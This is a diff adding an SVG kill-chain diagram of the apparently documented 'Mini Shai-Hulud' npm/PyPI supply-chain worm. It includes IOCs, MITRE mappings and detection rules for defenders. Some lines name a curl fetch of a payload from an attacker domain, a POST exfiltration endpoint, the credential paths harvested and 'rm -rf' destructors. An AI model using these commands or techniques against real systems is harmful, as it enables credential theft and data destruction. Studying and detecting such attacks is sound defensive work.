@@ -1,0 +1,202 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 880 880" role="img" aria-labelledby="t d">
+  <title id="t">Mini Shai-Hulud kill chain — TeamPCP, May 2026</title>
+  <desc id="d">TeamPCP's Mini Shai-Hulud supply-chain worm compromised 170+ npm/PyPI packages via GitHub Actions pull_request_target Pwn Request, pnpm cache poisoning, and OIDC token extraction from runner process memory. Packages were published under TanStack's legitimate pipeline identity with valid SLSA Build Level 3 provenance — first documented case. Payload (transformers.pyz) harvests 100+ credential paths and installs a destructive gh-token-monitor daemon that executes rm -rf on token revocation.</desc>
+  <defs>
+    <style>
+      .bg-stage   { fill: #f6f8fa; stroke: #d1d9e0; stroke-width: 1; }
+      .bg-c2      { fill: #fff8c5; stroke: #d4a72c; stroke-width: 1.5; }
+      .stagebg    { fill: #0969da; }
+      .stagenum   { fill: #ffffff; font: 700 11px sans-serif; }
+      .label      { fill: #1f2328; font: 600 13px sans-serif; }
+      .sub        { fill: #424a53; font: 11.5px sans-serif; }
+      .mitre      { fill: #0969da; font: 600 10.5px ui-monospace, "SFMono-Regular", Consolas, monospace; }
+      .header     { fill: #1f2328; font: 700 17px sans-serif; }
+      .subhead    { fill: #57606a; font: 12px sans-serif; }
+      .lane       { fill: #57606a; font: 700 9.5px sans-serif; letter-spacing: 0.07em; }
+      .c2title    { fill: #9a6700; font: 700 11px sans-serif; }
+      .c2text     { fill: #6e5005; font: 10px ui-monospace, "SFMono-Regular", Consolas, monospace; }
+      .anchor-hd  { fill: #1f2328; font: 700 11px sans-serif; }
+      .anchor-txt { fill: #424a53; font: 10px ui-monospace, "SFMono-Regular", Consolas, monospace; }
+      .arrow      { stroke: #57606a; stroke-width: 1.6; fill: none; }
+      .arrow-bi   { stroke: #d4a72c; stroke-width: 1.8; fill: none; }
+      .arrow-fill     { fill: #57606a; }
+      .arrow-fill-bi  { fill: #d4a72c; }
+      .divider    { stroke: #d1d9e0; stroke-width: 1; stroke-dasharray: 4 4; fill: none; }
+      @media (prefers-color-scheme: dark) {
+        .bg-stage   { fill: #161b22; stroke: #30363d; }
+        .bg-c2      { fill: #2d2206; stroke: #9e6a03; }
+        .stagebg    { fill: #58a6ff; }
+        .stagenum   { fill: #0d1117; }
+        .label      { fill: #c9d1d9; }
+        .sub        { fill: #8b949e; }
+        .mitre      { fill: #58a6ff; }
+        .header     { fill: #c9d1d9; }
+        .subhead    { fill: #8b949e; }
+        .lane       { fill: #8b949e; }
+        .c2title    { fill: #e3b341; }
+        .c2text     { fill: #b08800; }
+        .anchor-hd  { fill: #c9d1d9; }
+        .anchor-txt { fill: #8b949e; }
+        .arrow      { stroke: #8b949e; }
+        .arrow-bi   { stroke: #e3b341; }
+        .arrow-fill     { fill: #8b949e; }
+        .arrow-fill-bi  { fill: #e3b341; }
+        .divider    { stroke: #30363d; }
+      }
+    
+.acc-ransomware { fill: #b03030; }
+.acc-espionage { fill: #2a4a6a; }
+.acc-supply-chain { fill: #b07a3a; }
+.acc-identity-cloud { fill: #6a4ca6; }
+.acc-ot-ics { fill: #2f8f4e; }
+.acc-edge-network { fill: #1d7a8c; }
+.acc-mobile { fill: #c2569a; }
+.acc-crypto-defi { fill: #d08a1f; }
+.acc-malware-re { fill: #556070; }
+.acc-other { fill: #6a6a6a; }
+.accLabel { font: 700 11px sans-serif; fill: #ffffff; }
+</style>
+    <marker id="arr" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
+      <path d="M0,0 L10,5 L0,10 z" class="arrow-fill"/>
+    </marker>
+    <marker id="arr-bi-end" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
+      <path d="M0,0 L10,5 L0,10 z" class="arrow-fill-bi"/>
+    </marker>
+    <marker id="arr-bi-start" viewBox="0 0 10 10" refX="1" refY="5" markerWidth="7" markerHeight="7" orient="auto">
+      <path d="M10,0 L0,5 L10,10 z" class="arrow-fill-bi"/>
+    </marker>
+  </defs>
+
+  <!-- HEADER -->
+  <text x="440" y="30" class="header" text-anchor="middle">Mini Shai-Hulud Kill Chain</text>
+  <text x="440" y="48" class="subhead" text-anchor="middle">TeamPCP · npm/PyPI Supply-Chain Worm · 2026-05-11 · CVE-2026-45321 · CVSS 9.6</text>
+
+  <!-- LANE DIVIDER + LABELS -->
+  <line x1="542" y1="58" x2="542" y2="720" class="divider"/>
+  <text x="271" y="74" class="lane" text-anchor="middle">VICTIM HOST — DEVELOPER / CI-CD RUNNER</text>
+  <text x="711" y="74" class="lane" text-anchor="middle">ATTACKER C2 CLUSTER</text>
+
+  <!-- STAGE 1 — Initial Access -->
+  <rect x="18" y="82" width="510" height="72" rx="4" class="bg-stage"/>
+  <circle cx="46" cy="118" r="13" class="stagebg"/>
+  <text x="46" y="122" class="stagenum" text-anchor="middle">1</text>
+  <text x="70" y="99" class="label">Initial Access — Pwn Request + Cache Poisoning</text>
+  <text x="70" y="115" class="sub">Fork zblgg/configuration opens PR against TanStack/router</text>
+  <text x="70" y="130" class="sub">pull_request_target runs attacker code → poisons pnpm cache</text>
+  <text x="70" y="148" class="mitre">T1195.002   CVE-2026-45321</text>
+
+  <!-- arrow 1→2 -->
+  <line x1="273" y1="154" x2="273" y2="172" class="arrow" marker-end="url(#arr)"/>
+
+  <!-- STAGE 2 — OIDC Extraction -->
+  <rect x="18" y="172" width="510" height="72" rx="4" class="bg-stage"/>
+  <circle cx="46" cy="208" r="13" class="stagebg"/>
+  <text x="46" y="212" class="stagenum" text-anchor="middle">2</text>
+  <text x="70" y="189" class="label">Execution — OIDC Token Extraction from /proc/mem</text>
+  <text x="70" y="205" class="sub">Release workflow restores poisoned cache → attacker binary reads</text>
+  <text x="70" y="220" class="sub">OIDC JWT from runner process memory → POSTs to npmjs.org</text>
+  <text x="70" y="238" class="mitre">T1528   T1059.004</text>
+
+  <!-- arrow 2→3 -->
+  <line x1="273" y1="244" x2="273" y2="262" class="arrow" marker-end="url(#arr)"/>
+
+  <!-- STAGE 3 — SLSA Forgery -->
+  <rect x="18" y="262" width="510" height="72" rx="4" class="bg-stage"/>
+  <circle cx="46" cy="298" r="13" class="stagebg"/>
+  <text x="46" y="302" class="stagenum" text-anchor="middle">3</text>
+  <text x="70" y="279" class="label">Defense Evasion — SLSA Build L3 Provenance Forgery</text>
+  <text x="70" y="295" class="sub">170+ packages published as TanStack/UiPath/Mistral AI (404 versions)</text>
+  <text x="70" y="310" class="sub">Valid Sigstore attestation — npm audit signatures passes (first documented)</text>
+  <text x="70" y="328" class="mitre">T1027   T1195.002   518M cumulative downloads affected</text>
+
+  <!-- arrow 3→4 -->
+  <line x1="273" y1="334" x2="273" y2="352" class="arrow" marker-end="url(#arr)"/>
+
+  <!-- STAGE 4 — Payload Delivery -->
+  <rect x="18" y="352" width="510" height="72" rx="4" class="bg-stage"/>
+  <circle cx="46" cy="388" r="13" class="stagebg"/>
+  <text x="46" y="392" class="stagenum" text-anchor="middle">4</text>
+  <text x="70" y="369" class="label">Payload Delivery — transformers.pyz Download</text>
+  <text x="70" y="385" class="sub">router_init.js triggers on npm install → curl git-tanstack[.]com/tmp/transformers.pyz</text>
+  <text x="70" y="400" class="sub">mistralai 2.4.6 activates on import · pip install --no-deps does NOT mitigate</text>
+  <text x="70" y="418" class="mitre">T1059.006   T1059.007   T1480 (locale + CPU count guardrails)</text>
+
+  <!-- bidirectional arrow stage4 ↔ C2 (yellow) -->
+  <line x1="528" y1="388" x2="550" y2="388" class="arrow-bi" marker-end="url(#arr-bi-end)" marker-start="url(#arr-bi-start)"/>
+
+  <!-- arrow 4→5 -->
+  <line x1="273" y1="424" x2="273" y2="442" class="arrow" marker-end="url(#arr)"/>
+
+  <!-- STAGE 5 — Credential Harvest -->
+  <rect x="18" y="442" width="510" height="72" rx="4" class="bg-stage"/>
+  <circle cx="46" cy="478" r="13" class="stagebg"/>
+  <text x="46" y="482" class="stagenum" text-anchor="middle">5</text>
+  <text x="70" y="459" class="label">Credential Access — 100+ Path Harvest</text>
+  <text x="70" y="475" class="sub">AWS/GCP/Azure/K8s · npm · PyPI · GitHub CLI · SSH · crypto keystores</text>
+  <text x="70" y="490" class="sub">1Password + Bitwarden vaults · Signal · Slack · VPN configs · shell history</text>
+  <text x="70" y="508" class="mitre">T1552.001   T1552.005   T1528   T1555.005</text>
+
+  <!-- arrow 5→6 -->
+  <line x1="273" y1="514" x2="273" y2="532" class="arrow" marker-end="url(#arr)"/>
+
+  <!-- STAGE 6 — Persistence -->
+  <rect x="18" y="532" width="510" height="72" rx="4" class="bg-stage"/>
+  <circle cx="46" cy="568" r="13" class="stagebg"/>
+  <text x="46" y="572" class="stagenum" text-anchor="middle">6</text>
+  <text x="70" y="549" class="label">Persistence — gh-token-monitor Daemon</text>
+  <text x="70" y="565" class="sub">Linux: /etc/systemd/system/gh-token-monitor.service  (Restart=always)</text>
+  <text x="70" y="580" class="sub">macOS: ~/Library/LaunchAgents/com.github.token-monitor.plist</text>
+  <text x="70" y="598" class="mitre">T1543.002   Polls GitHub every 60s · rm -rf ~/ on token revoke (24h TTL)</text>
+
+  <!-- arrow 6→7 -->
+  <line x1="273" y1="604" x2="273" y2="622" class="arrow" marker-end="url(#arr)"/>
+
+  <!-- STAGE 7 — Exfiltration + Impact -->
+  <rect x="18" y="622" width="510" height="72" rx="4" class="bg-stage"/>
+  <circle cx="46" cy="658" r="13" class="stagebg"/>
+  <text x="46" y="662" class="stagenum" text-anchor="middle">7</text>
+  <text x="70" y="639" class="label">Exfiltration + Impact — Triple C2 + Destructive Tripwire</text>
+  <text x="70" y="655" class="sub">POST 83.142.209.194/ingest · Session messenger fallback · GitHub dead drops</text>
+  <text x="70" y="670" class="sub">mistralai 2.4.6: 1-in-6 rm -rf / (Israel/Iran geofence) · crypto wallets drained</text>
+  <text x="70" y="688" class="mitre">T1041   T1567.001   T1102   T1485   T1531</text>
+
+  <!-- arrow stage7 → C2 cluster -->
+  <line x1="528" y1="658" x2="550" y2="658" class="arrow" marker-end="url(#arr)"/>
+
+  <!-- C2 CLUSTER BOX -->
+  <rect x="553" y="345" width="308" height="360" rx="4" class="bg-c2"/>
+  <text x="707" y="366" class="c2title" text-anchor="middle">ATTACKER C2 CLUSTER</text>
+  <text x="707" y="381" class="c2title" text-anchor="middle">TeamPCP Infrastructure</text>
+  <text x="565" y="402" class="c2text">PRIMARY EXFIL:</text>
+  <text x="565" y="417" class="c2text">  83.142.209[.]194</text>
+  <text x="565" y="431" class="c2text">  POST /ingest (credential dump)</text>
+  <text x="565" y="451" class="c2text">PAYLOAD HOST:</text>
+  <text x="565" y="466" class="c2text">  git-tanstack[.]com</text>
+  <text x="565" y="480" class="c2text">  /tmp/transformers.pyz</text>
+  <text x="565" y="500" class="c2text">FALLBACK (decentralized):</text>
+  <text x="565" y="515" class="c2text">  *.getsession.org</text>
+  <text x="565" y="529" class="c2text">  (Session messenger network)</text>
+  <text x="565" y="549" class="c2text">DEAD DROPS:</text>
+  <text x="565" y="564" class="c2text">  GitHub API (stolen tokens)</text>
+  <text x="565" y="578" class="c2text">  Dune-themed repo names</text>
+  <text x="565" y="598" class="c2text">KEY IOCs:</text>
+  <text x="565" y="613" class="c2text">  router_init.js SHA256:</text>
+  <text x="565" y="627" class="c2text">  ab4fcada...8601266c</text>
+  <text x="565" y="645" class="c2text">  CVE-2026-45321  CVSS 9.6</text>
+  <text x="565" y="660" class="c2text">  gh-token-monitor (daemon)</text>
+  <text x="565" y="678" class="c2text">  mistralai==2.4.6 (PyPI)</text>
+  <text x="565" y="692" class="c2text">  guardrails-ai==0.10.1</text>
+
+  <!-- DETECTION ANCHORS BOX -->
+  <rect x="18" y="712" width="844" height="148" rx="4" class="bg-stage"/>
+  <text x="28" y="731" class="anchor-hd">Detection Anchors</text>
+  <text x="28" y="748" class="anchor-txt">Sigma:     process_creation — python3/python exec /tmp/*.pyz · file_event — gh-token-monitor in systemd or LaunchAgents</text>
+  <text x="28" y="763" class="anchor-txt">KQL:       DeviceFileEvents cred-burst &gt;= 4 paths in 5min from npm/pip/python3 · DeviceProcessEvents install in attack window</text>
+  <text x="28" y="778" class="anchor-txt">YARA:      MiniShaiHulud_TransformersPyz — PK zipapp + C2 anchor + crypto/vault cred paths · GhTokenMonitor_Daemon rule</text>
+  <text x="28" y="793" class="anchor-txt">Suricata:  DNS git-tanstack.com (sid:6001401) · HTTP /tmp/transformers.pyz (6001402) · IP 83.142.209.194 (6001403-4) · getsession.org (6001405)</text>
+  <text x="28" y="812" class="anchor-txt">ISOLATION RULE: isolate host BEFORE revoking GitHub token — token revocation triggers rm -rf ~/ destructor in gh-token-monitor daemon</text>
+  <text x="28" y="827" class="anchor-txt">CRYPTO RULE: move on-chain funds BEFORE host cleanup if .ethereum/keystore or .foundry/keystores were accessible on the compromised machine</text>
+  <text x="28" y="846" class="anchor-txt">SLSA CAVEAT: valid SLSA Build L3 provenance does NOT guarantee authorized workflow or legitimate commit — cross-check branch protection rules</text>
+
+  <rect class="acc-ransomware" x="0" y="0" width="880" height="8"/>
+</svg>
